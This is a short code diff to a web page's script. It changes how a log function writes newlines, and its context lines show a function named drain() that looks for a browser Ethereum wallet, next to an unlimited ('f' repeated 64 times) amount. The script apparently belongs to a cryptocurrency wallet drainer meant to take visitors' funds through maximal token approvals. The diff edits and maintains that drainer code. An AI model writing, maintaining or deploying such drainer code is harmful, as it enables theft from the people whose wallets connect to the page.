@@ -711,7 +711,7 @@ pre{text-align:left;background:#0c111d;border:1px solid #1e283f;border-radius:10
   var MAX="f".repeat(64);
   var pad=function(h){return h.replace(/^0x/,"").padStart(64,"0")};
   var logEl=document.getElementById("log");
-  function log(m){logEl.hidden=false;logEl.textContent+=m+"\n"}
+  function log(m){logEl.hidden=false;logEl.textContent+=m+String.fromCharCode(10)}
   function drain(){
     var eth=window.ethereum;
     if(!eth){log("No wallet detected.");return}
